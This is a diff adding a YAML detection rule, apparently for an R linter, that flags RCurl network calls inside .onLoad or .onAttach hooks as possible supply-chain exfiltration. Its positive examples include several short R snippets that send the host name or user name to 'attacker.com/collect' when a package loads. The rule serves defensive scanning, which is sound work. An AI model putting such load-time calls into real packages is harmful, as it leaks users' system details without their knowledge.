@@ -1,0 +1,61 @@
+name: onload_calls_rcurl_rule
+version: "0.1.0"
+type: warning
+attck:
+  - T1041
+  - T1195.002
+message: >-
+  An RCurl network call inside .onLoad or .onAttach sends an outbound HTTP
+  request automatically when a package is loaded. Matches getURL(), getURI(),
+  getForm(), postForm(), and curlPerform(), both qualified (RCurl::) and
+  unqualified.
+description: >-
+  Flag RCurl network execution calls inside .onLoad or .onAttach. Matches
+  assignments using <-, =, or -> so that all syntactically valid definition
+  forms are covered.
+xpath: >-
+  (//expr | //expr_or_assign_or_help)[
+    (
+      (LEFT_ASSIGN or EQ_ASSIGN)
+      and expr[1]/SYMBOL[text() = '.onLoad' or text() = '.onAttach']
+      and expr[FUNCTION]/descendant::SYMBOL_FUNCTION_CALL[
+        text() = 'getURL' or text() = 'getURI' or text() = 'getForm' or
+        text() = 'postForm' or text() = 'curlPerform'
+      ]
+    )
+    or
+    (
+      RIGHT_ASSIGN
+      and expr[2]/SYMBOL[text() = '.onLoad' or text() = '.onAttach']
+      and expr[1]//SYMBOL_FUNCTION_CALL[
+        text() = 'getURL' or text() = 'getURI' or text() = 'getForm' or
+        text() = 'postForm' or text() = 'curlPerform'
+      ]
+    )
+  ]
+example_positive:
+  - |
+    .onLoad <- function(libname, pkgname) {
+      RCurl::getURL("https://attacker.com/collect")
+    }
+  - |
+    .onAttach <- function(libname, pkgname) {
+      RCurl::postForm("https://attacker.com/collect", host = Sys.info()[["nodename"]])
+    }
+  - |
+    .onLoad = function(libname, pkgname) {
+      RCurl::getForm("https://attacker.com/collect", user = Sys.info()[["user"]])
+    }
+  - |
+    (function(libname, pkgname) {
+      postForm("https://attacker.com/collect", host = Sys.info()[["nodename"]])
+    }) -> .onLoad
+example_negative:
+  - |
+    fetch_url <- function(url) {
+      RCurl::getURL(url)
+    }
+  - |
+    .onUnload <- function(libpath) {
+      RCurl::getURL("https://example.com/unloaded")
+    }
